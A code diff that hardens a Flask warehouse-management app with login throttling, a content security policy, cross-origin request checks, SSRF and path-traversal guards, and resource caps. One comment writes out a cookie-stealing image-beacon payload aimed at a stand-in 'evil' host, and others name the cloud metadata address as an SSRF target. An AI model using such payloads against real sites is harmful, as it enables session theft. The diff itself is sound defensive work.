@@ -1,6 +1,7 @@
 import os
 import re
 import time
+import logging
 import uuid
 import base64
 import secrets
@@ -12,7 +13,7 @@ from flask_login import LoginManager, UserMixin, login_user, logout_user, login_
 from werkzeug.security import generate_password_hash, check_password_hash
 import sqlite3
 
-APP_VERSION = '1.9.1'
+APP_VERSION = '1.9.3'
 
 
 def _compute_build_fingerprint():
@@ -151,6 +152,102 @@ LOGIN_FAIL_LIMIT = 5
 LOCKOUT_MINUTES = 15
 PASSWORD_MIN_LENGTH = 8
 
+# Per-IP throttle, applied alongside the per-account lockout. Without it, one
+# host can walk every known username into a 15-minute lockout and keep them
+# there — the account lockout on its own is a denial-of-service primitive.
+LOGIN_IP_FAIL_LIMIT = 20
+LOGIN_IP_WINDOW_MINUTES = 15
+
+# Resource ceilings on endpoints any signed-in user can reach.
+LABEL_BATCH_MAX = 500       # labels per batch PDF
+IMPORT_MAX_ROWS = 50000     # rows materialized from one spreadsheet
+
+# Authentication events are logged at INFO with the source IP so there is an
+# audit trail for lockouts and credential stuffing. Gunicorn captures stderr.
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s %(levelname)s [%(name)s] %(message)s',
+)
+app.logger.setLevel(logging.INFO)
+
+
+def _client_ip():
+    """Best-effort source address for logging and throttling.
+
+    Deliberately reads only remote_addr and never X-Forwarded-For: that header
+    is attacker-controlled unless a trusted proxy is known to overwrite it, and
+    honouring it blindly would let anyone bypass the throttle by varying the
+    header. Behind a reverse proxy every request appears to come from the proxy
+    — wrap the app in werkzeug's ProxyFix (with the proxy count set) if you
+    need real client addresses there.
+    """
+    return request.remote_addr or 'unknown'
+
+
+def _ip_recent_failures(conn, ip):
+    """Failed logins from this IP inside the throttle window."""
+    from datetime import datetime, timedelta
+    cutoff = (datetime.utcnow() - timedelta(minutes=LOGIN_IP_WINDOW_MINUTES)
+              ).strftime('%Y-%m-%d %H:%M:%S')
+    try:
+        # Opportunistic prune so the table never grows without bound.
+        conn.execute("DELETE FROM login_attempts WHERE created_at < ?", (cutoff,))
+        row = conn.execute(
+            "SELECT COUNT(*) AS n FROM login_attempts WHERE ip = ? AND created_at >= ?",
+            (ip, cutoff)
+        ).fetchone()
+        return row['n'] if row else 0
+    except Exception:
+        return 0  # never let bookkeeping break the ability to sign in
+
+
+def _record_login_failure(conn, ip, username):
+    from datetime import datetime
+    try:
+        conn.execute(
+            "INSERT INTO login_attempts (ip, username, created_at) VALUES (?, ?, ?)",
+            (ip, (username or '')[:120], datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'))
+        )
+        conn.commit()
+    except Exception:
+        pass
+
+
+# Content-Security-Policy for application responses.
+#
+# What this does and doesn't buy: the SPA is built from inline <script> blocks
+# and ~330 inline event-handler attributes, so 'unsafe-inline' has to stay in
+# script-src and the policy cannot stop injected script from *running*.
+# Dropping it (or adding script-src-attr 'none', which kills every onclick=)
+# would require converting every handler to addEventListener first.
+#
+# What it does stop is the part that turns an injection into a breach —
+# getting the data out, and loading attacker code from elsewhere:
+#   connect-src 'self'   fetch/XHR/WebSocket to an attacker host
+#   img-src              beaconing via <img src="//evil/?c="+document.cookie>
+#   form-action 'self'   posting a form to an external collector
+#   object-src 'none'    plugin/embed vectors
+#   base-uri 'self'      <base> hijacking of every relative URL
+# frame-ancestors is deliberately absent: X-Frame-Options: DENY already
+# covers clickjacking, and routes that must be framed same-origin (the KB PDF
+# preview) relax that header themselves — a global frame-ancestors would
+# override them.
+_CSP_BASE = (
+    "default-src 'self'; "
+    "script-src 'self' 'unsafe-inline'{ts_script}; "
+    "style-src 'self' 'unsafe-inline'; "
+    "img-src 'self' data: blob:; "
+    "font-src 'self' data:; "
+    "connect-src 'self'; "
+    "frame-src 'self'{ts_frame}; "
+    "base-uri 'self'; "
+    "form-action 'self'; "
+    "object-src 'none'"
+)
+# Turnstile is an optional third-party widget and only ever renders on the
+# login page, so its origin is allowed there and nowhere else.
+_TURNSTILE_ORIGIN = 'https://challenges.cloudflare.com'
+
 
 @app.after_request
 def _security_headers(resp):
@@ -160,10 +257,137 @@ def _security_headers(resp):
     resp.headers.setdefault('Referrer-Policy', 'same-origin')
     resp.headers.setdefault('Permissions-Policy',
                             'geolocation=(), camera=(), microphone=(), payment=()')
+    # setdefault: routes that serve user-uploaded bytes set their own, stricter
+    # policy (sandbox / default-src 'none') and must win.
+    on_login = request.endpoint == 'login'
+    resp.headers.setdefault('Content-Security-Policy', _CSP_BASE.format(
+        ts_script=(' ' + _TURNSTILE_ORIGIN) if on_login else '',
+        ts_frame=(' ' + _TURNSTILE_ORIGIN) if on_login else '',
+    ))
     if _SECURE_COOKIES:
         resp.headers.setdefault('Strict-Transport-Security',
                                 'max-age=31536000; includeSubDomains')
     return resp
+
+
+# ══════════════════════════════════════════
+#  REQUEST GUARDS
+#  Cross-cutting checks applied before any view runs. These live here rather
+#  than as per-route decorators so a route added later cannot silently miss
+#  them — the module gate in particular replaced a plan to hand-annotate ~40
+#  Inventory/Work-Order routes.
+# ══════════════════════════════════════════
+
+_STATE_CHANGING_METHODS = frozenset(('POST', 'PUT', 'PATCH', 'DELETE'))
+
+# Path prefix → module key. A request whose path matches one of these is
+# refused with 403 while that module is switched off, so the toggles in
+# Settings → Modules are real access control and not just UI chrome.
+# Settings routes are deliberately absent: an admin needs to be able to
+# configure a module before switching it on.
+_MODULE_ROUTE_PREFIXES = (
+    ('/api/parts', 'inventory'),
+    ('/api/categories', 'inventory'),
+    ('/api/stats', 'inventory'),
+    ('/api/labels', 'inventory'),
+    ('/api/import', 'inventory'),
+    ('/api/export', 'inventory'),
+    ('/api/work-orders', 'work_orders'),
+    # Every row in `notifications` is a work-order event (only _notify_wo_event
+    # writes to it) and the payload carries WO numbers and customer-facing
+    # titles, so it follows the Work Orders toggle.
+    ('/api/notifications', 'work_orders'),
+    ('/api/kb', 'knowledge_base'),
+    ('/api/zonechart', 'zone_chart'),
+)
+_MODULE_LABELS = {
+    'inventory': 'Inventory', 'work_orders': 'Work Orders',
+    'knowledge_base': 'Knowledge Base', 'glossary': 'Glossary',
+    'zone_chart': 'UPS Zone Chart',
+}
+
+# API paths that stay reachable while the first-run wizard is still pending.
+# Everything else is refused, so a container left unattended on a network with
+# the seeded admin/admin account can't be driven through the rest of the API.
+_SETUP_OPEN_PATHS = (
+    '/api/setup/', '/api/auth/me', '/api/auth/turnstile-config',
+    '/api/version', '/api/changelog',
+)
+
+
+def _module_for_path(path):
+    for prefix, key in _MODULE_ROUTE_PREFIXES:
+        if path == prefix or path.startswith(prefix + '/'):
+            return key
+    return None
+
+
+def _request_is_cross_origin():
+    """True when a request carries a browser-supplied Origin (or Referer) that
+    doesn't belong to this host.
+
+    Only the host is compared, never the scheme: a TLS-terminating reverse
+    proxy forwards Origin: https://… while the app itself sees http, and
+    comparing schemes would reject every write behind such a proxy.
+
+    A request with neither header is allowed through — those come from
+    non-browser clients (curl, server-to-server), which aren't subject to
+    cookie-riding CSRF in the first place. An unparseable or opaque origin
+    (e.g. the literal "null" a sandboxed iframe sends) has no netloc and is
+    treated as foreign.
+    """
+    from urllib.parse import urlparse
+    source = request.headers.get('Origin') or request.headers.get('Referer')
+    if not source:
+        return False
+    try:
+        netloc = urlparse(source).netloc
+    except Exception:
+        return True
+    return netloc != request.host
+
+
+@app.before_request
+def _request_guards():
+    # 1. CSRF — same-origin enforcement on every state-changing request,
+    #    including /login (a cross-site login form can otherwise sign a victim
+    #    into an attacker's account) and /logout.
+    if request.method in _STATE_CHANGING_METHODS and _request_is_cross_origin():
+        return jsonify({'error': 'Cross-origin request rejected'}), 403
+
+    path = request.path
+    if not path.startswith('/api/'):
+        return None
+    # The external KB API authenticates with its own API key and is not part
+    # of the browser session, so neither gate below applies to it.
+    if path.startswith('/api/external/'):
+        return None
+    # Let the auth layer answer first: without this an unauthenticated caller
+    # could read module state off the status code.
+    if not current_user.is_authenticated:
+        return None
+
+    conn = get_db()
+    try:
+        # 2. First-run wizard still pending → only the wizard's own endpoints.
+        if not _get_setting(conn, 'setup_complete', True):
+            if not any(path == p.rstrip('/') or path.startswith(p)
+                       for p in _SETUP_OPEN_PATHS):
+                return jsonify({
+                    'error': 'Setup is not complete. Finish the setup wizard first.'
+                }), 403
+            return None
+
+        # 3. Module disabled → its API is closed to every role.
+        key = _module_for_path(path)
+        if key and not _module_enabled(conn, key):
+            return jsonify({
+                'error': f'{_MODULE_LABELS.get(key, key)} module is disabled'
+            }), 403
+    finally:
+        conn.close()
+    return None
+
 
 DATABASE = os.path.join(DATA_DIR, 'warehouse.db')
 
@@ -1301,6 +1525,23 @@ def migrate_v43(conn):
             pass
 
 
+def migrate_v44(conn):
+    """Record failed login attempts per source IP so the login route can rate
+    limit by origin as well as by account. The per-account lockout alone let
+    an unauthenticated attacker keep any known username locked out
+    indefinitely; throttling the IP caps how fast that can be driven. Rows are
+    pruned as they age out of the window, so the table stays tiny."""
+    conn.executescript('''
+        CREATE TABLE IF NOT EXISTS login_attempts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip TEXT NOT NULL,
+            username TEXT DEFAULT '',
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        );
+        CREATE INDEX IF NOT EXISTS idx_login_attempts_ip ON login_attempts(ip, created_at);
+    ''')
+
+
 # ┌──────────────────────────────────────────────┐
 # │  MIGRATIONS REGISTRY — append new ones here  │
 # └──────────────────────────────────────────────┘
@@ -1348,6 +1589,7 @@ MIGRATIONS = [
     (41, migrate_v41),
     (42, migrate_v42),
     (43, migrate_v43),
+    (44, migrate_v44),
 ]
 
 
@@ -1382,6 +1624,29 @@ def init_db():
             print(f"  ✓ {applied} migration(s) applied (now at v{MIGRATIONS[-1][0]})")
         else:
             print(f"  ✓ Database up to date (v{current_version})")
+
+        # Loud, repeated-on-every-boot warning while the first-run wizard is
+        # still pending: until it's finished the seeded admin/admin login
+        # works, so an instance reachable from an untrusted network is open.
+        # The API itself is gated in _request_guards; this is the operator
+        # -facing half of that.
+        try:
+            if not _get_setting(conn, 'setup_complete', True):
+                print("  ╔═══════════════════════════════════════════════╗")
+                print("  ║  ⚠  SETUP IS NOT COMPLETE                     ║")
+                print("  ║  The default admin/admin login is still       ║")
+                print("  ║  active. Sign in and finish the setup wizard  ║")
+                print("  ║  before exposing this instance to a network.  ║")
+                print("  ║  Until then the API is restricted to the      ║")
+                print("  ║  setup endpoints.                             ║")
+                print("  ╚═══════════════════════════════════════════════╝")
+        except Exception:
+            pass
+
+        if not _SECURE_COOKIES:
+            print("  ⚠  WM_SECURE_COOKIES is not set — session cookies will be")
+            print("     sent over plain HTTP. Set WM_SECURE_COOKIES=1 once this")
+            print("     instance is served over HTTPS (see README → Deployment).")
 
         conn.close()
     finally:
@@ -1679,6 +1944,21 @@ def login():
 
         from datetime import datetime, timedelta
         conn = get_db()
+        client_ip = _client_ip()
+
+        # ── Per-IP throttle, checked before anything account-specific ──
+        if _ip_recent_failures(conn, client_ip) >= LOGIN_IP_FAIL_LIMIT:
+            conn.close()
+            app.logger.warning(
+                "auth: ip-throttled login attempt from %s for username=%r", client_ip, username)
+            err = (f"Too many failed sign-in attempts from this address. "
+                   f"Try again in {LOGIN_IP_WINDOW_MINUTES} minutes.")
+            if is_ajax:
+                return jsonify({'error': err}), 429
+            # Carry the status on the HTML path too, so a plain form post is
+            # not reported as a success by proxies, logs or monitoring.
+            return render_template('login.html', error=err, **ts_ctx), 429
+
         row = conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
 
         # ── Check lockout state before verifying the password ──
@@ -1704,7 +1984,10 @@ def login():
         _DUMMY_HASH = generate_password_hash('invalid', method='pbkdf2:sha256')
         if locked_msg:
             check_password_hash(_DUMMY_HASH, password)
+            _record_login_failure(conn, client_ip, username)
             conn.close()
+            app.logger.warning(
+                "auth: attempt on locked account username=%r from %s", username, client_ip)
             if is_ajax:
                 return jsonify({'error': locked_msg}), 423
             return render_template('login.html', error=locked_msg, **ts_ctx)
@@ -1717,6 +2000,9 @@ def login():
             )
             conn.commit()
             conn.close()
+            app.logger.info(
+                "auth: successful login username=%r role=%s from %s",
+                row['username'], row['role'], client_ip)
             user = User(row['id'], row['username'], row['display_name'], row['role'], row['active'])
             login_user(user, remember=True)
             session.permanent = True
@@ -1734,6 +2020,10 @@ def login():
         # Failure — burn a hash for missing users so timing can't distinguish
         if not row:
             check_password_hash(_DUMMY_HASH, password)
+
+        # Every failure counts against the IP, including ones for usernames
+        # that don't exist — otherwise username enumeration is free.
+        _record_login_failure(conn, client_ip, username)
 
         # Record the failure against an existing user (not unknown usernames
         # — we don't want to create lockouts for accounts that don't exist).
@@ -1757,11 +2047,15 @@ def login():
         conn.close()
 
         if attempts_left == 0:
+            app.logger.warning(
+                "auth: account locked username=%r after %d failures, from %s",
+                username, LOGIN_FAIL_LIMIT, client_ip)
             err = f"Account locked for {LOCKOUT_MINUTES} minutes after {LOGIN_FAIL_LIMIT} failed attempts."
             if is_ajax:
                 return jsonify({'error': err}), 423
             return render_template('login.html', error=err, **ts_ctx)
 
+        app.logger.info("auth: failed login username=%r from %s", username, client_ip)
         err = 'Invalid username or password'
         if is_ajax:
             return jsonify({'error': err}), 401
@@ -1770,9 +2064,11 @@ def login():
     return render_template('login.html', error=None, **ts_ctx)
 
 
-@app.route('/logout')
+@app.route('/logout', methods=['POST'])
 @login_required
 def logout():
+    """POST-only: as a GET this was forgeable with a bare <img src="/logout">
+    on any page the user visited."""
     logout_user()
     return redirect(url_for('login'))
 
@@ -1989,8 +2285,9 @@ def change_own_password():
     current_pw = data.get('current_password', '')
     new_pw = data.get('new_password', '')
 
-    if not new_pw or len(new_pw) < PASSWORD_MIN_LENGTH:
-        return jsonify({'error': f'New password must be at least {PASSWORD_MIN_LENGTH} characters'}), 400
+    ok_pw, pw_reason = _score_password(new_pw)
+    if not ok_pw:
+        return jsonify({'error': pw_reason}), 400
 
     conn = get_db()
     row = conn.execute("SELECT password_hash FROM users WHERE id = ?", (current_user.id,)).fetchone()
@@ -2042,8 +2339,9 @@ def create_user():
         return jsonify({'error': 'Username and password are required'}), 400
     if not _valid_email(username):
         return jsonify({'error': 'Username must be a valid email address'}), 400
-    if len(password) < PASSWORD_MIN_LENGTH:
-        return jsonify({'error': f'Password must be at least {PASSWORD_MIN_LENGTH} characters'}), 400
+    ok_pw, pw_reason = _score_password(password)
+    if not ok_pw:
+        return jsonify({'error': pw_reason}), 400
     if role not in ('admin', 'editor', 'supervisor', 'viewer'):
         return jsonify({'error': 'Invalid role'}), 400
 
@@ -2118,9 +2416,10 @@ def update_user(uid):
     # Optional password reset
     new_pw = data.get('password', '')
     if new_pw:
-        if len(new_pw) < PASSWORD_MIN_LENGTH:
+        ok_pw, pw_reason = _score_password(new_pw)
+        if not ok_pw:
             conn.close()
-            return jsonify({'error': f'Password must be at least {PASSWORD_MIN_LENGTH} characters'}), 400
+            return jsonify({'error': pw_reason}), 400
         conn.execute("UPDATE users SET password_hash = ? WHERE id = ?",
                      (generate_password_hash(new_pw, method='pbkdf2:sha256'), uid))
 
@@ -2559,6 +2858,21 @@ def setup_page():
 
 _UPLOAD_NAME_RE = re.compile(r'^[a-f0-9]{32}\.(?:png|jpg|jpeg|gif|webp)$', re.IGNORECASE)
 
+# Import temp files are named by import_upload() as "<uuid4 hex>.<ext>". The
+# import routes take this name straight from the request body and join it onto
+# UPLOAD_TEMP, so it must be validated the same way /uploads/<filename> is —
+# otherwise an absolute path or ../ escapes the directory and turns the
+# preview into an arbitrary file read and the execute into an arbitrary delete.
+_IMPORT_TEMP_RE = re.compile(r'^[a-f0-9]{32}\.(?:xlsx|xls|xlsm|csv)$', re.IGNORECASE)
+
+
+def _safe_import_temp_path(temp_file):
+    """Resolve a client-supplied temp-file name to a path inside UPLOAD_TEMP,
+    or None if the name isn't one we generated."""
+    if not _IMPORT_TEMP_RE.match(temp_file or ''):
+        return None
+    return os.path.join(UPLOAD_TEMP, temp_file)
+
 
 @app.route('/uploads/<filename>')
 @login_required
@@ -2907,7 +3221,7 @@ def set_part_audit(pid):
 
 
 @app.route('/api/parts/<int:pid>/flag', methods=['POST'])
-@login_required
+@editor_required
 def toggle_flag(pid):
     conn = get_db()
     row = conn.execute("SELECT flagged FROM parts WHERE id = ?", (pid,)).fetchone()
@@ -3798,9 +4112,18 @@ def _send_stored_upload(path, stored_name, original_name):
     stored file's extension via EXT_MIME_MAP — never from the mime_type the
     uploader declared, which may already hold text/html in old rows — and only
     known-inert types (raster images, PDF) render inline; everything else is
-    forced to download. A sandboxing CSP is added so even a mislabeled file
-    can't script the app origin. PDF gets default-src 'none' instead of
-    sandbox because Chrome's viewer refuses to render sandboxed PDFs."""
+    forced to download.
+
+    Types forced to download also get a sandboxing CSP, so a mislabeled file
+    can't script the app origin if someone opens it directly. Inline types
+    (images, PDF) deliberately fall through to the ordinary application CSP
+    from _security_headers instead of a stricter one: the Content-Type here is
+    derived from the extension, so a .pdf can only ever be served as
+    application/pdf and can't be coerced into running as HTML, while a
+    document-level CSP on a PDF response risks interfering with the browser's
+    PDF viewer — which is what draws the Knowledge Base preview. Generated
+    label PDFs have always been served under the ordinary policy, so this
+    keeps both PDF paths consistent."""
     from flask import send_file
     ext = (stored_name or '').rsplit('.', 1)[-1].lower()
     inline = ext in IMAGE_EXTS or ext == 'pdf'
@@ -3810,8 +4133,8 @@ def _send_stored_upload(path, stored_name, original_name):
         as_attachment=not inline,
         download_name=original_name,
     )
-    resp.headers['Content-Security-Policy'] = (
-        "default-src 'none'" if ext == 'pdf' else 'sandbox')
+    if not inline:
+        resp.headers['Content-Security-Policy'] = 'sandbox'
     return resp
 
 
@@ -4091,6 +4414,69 @@ _WP_DL_MAX = 25 * 1024 * 1024   # cap a single downloaded file at 25 MB
 _WP_MAX_POSTS = 5000            # hard ceiling so a huge site can't run away
 
 
+_WP_GET_MAX = 10 * 1024 * 1024  # cap a single JSON response body at 10 MB
+
+
+def _host_is_internal(host):
+    """True when a hostname resolves to (or literally is) an address the
+    server shouldn't be made to fetch on someone else's behalf.
+
+    The importer follows URLs found inside a third-party site's post bodies,
+    so without this an attacker who controls the WordPress instance being
+    imported can point us at cloud metadata (169.254.169.254), at localhost,
+    or at hosts on the private network the container sits in, and read the
+    response back out of the Knowledge Base.
+
+    Every resolved address must be public — a hostname with both a public and
+    a loopback A record is rejected rather than raced.
+    """
+    import socket, ipaddress
+    if not host:
+        return True
+    try:
+        infos = socket.getaddrinfo(host, None)
+    except Exception:
+        return True  # unresolvable → refuse rather than guess
+    if not infos:
+        return True
+    for info in infos:
+        addr = info[4][0]
+        try:
+            ip = ipaddress.ip_address(addr.split('%')[0])
+        except ValueError:
+            return True
+        if (ip.is_private or ip.is_loopback or ip.is_link_local
+                or ip.is_multicast or ip.is_reserved or ip.is_unspecified):
+            return True
+        # IPv4-mapped/compatible IPv6 (::ffff:127.0.0.1) hides a v4 address
+        mapped = getattr(ip, 'ipv4_mapped', None)
+        if mapped is not None and (mapped.is_private or mapped.is_loopback
+                                   or mapped.is_link_local or mapped.is_reserved):
+            return True
+    return False
+
+
+def _wp_url_allowed(url):
+    """Gate every outbound importer fetch: http(s) only, and never an address
+    on the server's own network.
+
+    Deliberately not restricted to the configured site's host: WordPress
+    installs very commonly serve media from a CDN or a separate media
+    subdomain, and pinning to one host would break those imports. Refusing
+    internal addresses is what actually closes the attack — a hostile post
+    body can still name any *public* URL, but that is a fetch the attacker
+    could have made themselves.
+    """
+    from urllib.parse import urlparse
+    try:
+        p = urlparse(url or '')
+    except Exception:
+        return False
+    if p.scheme not in ('http', 'https') or not p.hostname:
+        return False
+    return not _host_is_internal(p.hostname)
+
+
 def _wp_normalize_base(url):
     url = (url or '').strip().rstrip('/')
     if not url:
@@ -4115,11 +4501,17 @@ def _wp_get(base, path, params=None, auth=None, timeout=25):
     import urllib.request, urllib.parse, json as json_mod
     qs = ('?' + urllib.parse.urlencode(params)) if params else ''
     url = f"{base}/wp-json{path}{qs}"
+    if not _wp_url_allowed(url):
+        raise ValueError('Refusing to fetch that address.')
     headers = {'User-Agent': 'WarehouseManager-KBImport'}
     headers.update(auth or {})
     req = urllib.request.Request(url, headers=headers)
     with urllib.request.urlopen(req, timeout=timeout) as resp:
-        body = resp.read()
+        # Bounded read: an endpoint that streams forever would otherwise
+        # exhaust the worker's memory.
+        body = resp.read(_WP_GET_MAX + 1)
+        if len(body) > _WP_GET_MAX:
+            raise ValueError('Response from the WordPress site was too large.')
         return json_mod.loads(body.decode('utf-8')), dict(resp.headers)
 
 
@@ -4257,8 +4649,15 @@ def _wp_map_post(post, mapping):
 
 
 def _wp_download_file(url, auth):
-    """Download a remote file → (stored, original, mime, size) or None."""
+    """Download a remote file → (stored, original, mime, size) or None.
+
+    `url` frequently comes out of the remote site's own post content, so it is
+    treated as hostile input and screened by _wp_url_allowed first.
+    """
     import urllib.request, urllib.parse, mimetypes
+    if not _wp_url_allowed(url):
+        app.logger.warning("wp-import: refused download from %r", url)
+        return None
     try:
         headers = {'User-Agent': 'WarehouseManager-KBImport'}
         headers.update(auth or {})
@@ -4496,11 +4895,23 @@ def kb_wp_connect():
     base = _wp_normalize_base(data.get('url'))
     if not base:
         return jsonify({'error': 'A WordPress URL is required'}), 400
+    if not _wp_url_allowed(base):
+        return jsonify({
+            'error': 'That address is not reachable for import. Use a public '
+                     'http(s) address — local, private-network and link-local '
+                     'hosts are refused.'
+        }), 400
     auth = _wp_auth_header(data.get('username'), data.get('app_password'))
     try:
         types, _ = _wp_get(base, '/wp/v2/types', auth=auth)
     except Exception as e:
-        return jsonify({'error': f'Could not reach the WordPress REST API at {base}/wp-json — {e}'}), 502
+        # The raw urllib exception leaks internals; the admin only needs to
+        # know we couldn't reach the address they typed.
+        app.logger.exception('wp-import: connect failed for %r', base)
+        return jsonify({
+            'error': f'Could not reach the WordPress REST API at {base}/wp-json. '
+                     'Check the address, that the REST API is enabled, and any credentials.'
+        }), 502
     post_types = []
     if isinstance(types, dict):
         for slug, info in types.items():
@@ -4818,22 +5229,46 @@ def _apply_head_chart(all_rows, hc_col, header_row=0):
     return all_rows
 
 
+def _import_read_error(exc):
+    """Client-safe message for a spreadsheet read failure.
+
+    Raw exception text from openpyxl/csv leaks absolute container paths and
+    library internals, so only our own deliberate ValueError messages (row
+    caps and similar) are passed through; anything else becomes a generic
+    string and the detail goes to the log instead.
+    """
+    app.logger.exception('import: failed to read uploaded file')
+    if isinstance(exc, ValueError) and str(exc):
+        return str(exc)
+    return 'Could not read that file. Check that it is a valid .xlsx, .xls, .xlsm or .csv.'
+
+
 def _read_file_rows(temp_path, sheet_name=None, hc_col=None, header_row=0):
     """Read all rows from a CSV or Excel file. Returns list of string lists.
     If hc_col is a non-negative int, append virtual HC columns parsed from that column."""
     import csv as csv_module
     ext = temp_path.rsplit('.', 1)[-1].lower()
     all_rows = []
+    # Row ceiling: a 16 MB spreadsheet can declare an enormous sheet that
+    # expands unboundedly once materialized, so stop reading rather than let
+    # one upload exhaust the worker.
     if ext == 'csv':
         with open(temp_path, 'r', encoding='utf-8-sig', errors='replace') as f:
             for row in csv_module.reader(f):
                 all_rows.append([str(c).strip() for c in row])
+                if len(all_rows) > IMPORT_MAX_ROWS:
+                    raise ValueError(
+                        f'File has more than {IMPORT_MAX_ROWS:,} rows — split it and import in parts.')
     else:
         from openpyxl import load_workbook
         wb = load_workbook(temp_path, read_only=True, data_only=True)
         ws = wb[sheet_name] if sheet_name else wb.active
         for row in ws.iter_rows(values_only=True):
             all_rows.append([str(c) if c is not None else '' for c in row])
+            if len(all_rows) > IMPORT_MAX_ROWS:
+                wb.close()
+                raise ValueError(
+                    f'Sheet has more than {IMPORT_MAX_ROWS:,} rows — split it and import in parts.')
         wb.close()
     if hc_col is not None and hc_col >= 0:
         _apply_head_chart(all_rows, hc_col, header_row)
@@ -4918,7 +5353,7 @@ def import_upload():
     except Exception as e:
         if os.path.exists(temp_path):
             os.remove(temp_path)
-        return jsonify({'error': f'Failed to read file: {str(e)}'}), 400
+        return jsonify({'error': _import_read_error(e)}), 400
 
 
 @app.route('/api/import/preview', methods=['POST'])
@@ -4944,14 +5379,16 @@ def import_preview():
     if category not in IMPORT_FIELDS:
         return jsonify({'error': 'Invalid category'}), 400
 
-    temp_path = os.path.join(UPLOAD_TEMP, temp_file)
+    temp_path = _safe_import_temp_path(temp_file)
+    if not temp_path:
+        return jsonify({'error': 'Invalid temp file reference.'}), 400
     if not os.path.exists(temp_path):
         return jsonify({'error': 'Uploaded file not found. Please re-upload.'}), 404
 
     try:
         all_rows = _read_file_rows(temp_path, sheet_name, hc_col=hc_col, header_row=header_row)
     except Exception as e:
-        return jsonify({'error': f'Failed to read file: {str(e)}'}), 400
+        return jsonify({'error': _import_read_error(e)}), 400
 
     # Data rows start after header
     data_rows = all_rows[header_row + 1:]
@@ -5033,14 +5470,16 @@ def import_execute():
     if category not in IMPORT_FIELDS:
         return jsonify({'error': 'Invalid category'}), 400
 
-    temp_path = os.path.join(UPLOAD_TEMP, temp_file)
+    temp_path = _safe_import_temp_path(temp_file)
+    if not temp_path:
+        return jsonify({'error': 'Invalid temp file reference.'}), 400
     if not os.path.exists(temp_path):
         return jsonify({'error': 'Uploaded file not found. Please re-upload.'}), 404
 
     try:
         all_rows = _read_file_rows(temp_path, sheet_name, hc_col=hc_col, header_row=header_row)
     except Exception as e:
-        return jsonify({'error': f'Failed to read file: {str(e)}'}), 400
+        return jsonify({'error': _import_read_error(e)}), 400
 
     data_rows = all_rows[header_row + 1:]
 
@@ -5374,6 +5813,12 @@ def batch_labels_pdf():
     part_ids = data.get('ids', [])
     if not part_ids:
         return jsonify({'error': 'No parts specified'}), 400
+    # Each id renders a page with a generated QR bitmap, so an unbounded list
+    # is a CPU/memory exhaustion primitive available to any signed-in user.
+    if not isinstance(part_ids, list) or len(part_ids) > LABEL_BATCH_MAX:
+        return jsonify({
+            'error': f'Too many labels in one batch (limit {LABEL_BATCH_MAX}).'
+        }), 400
 
     conn = get_db()
 
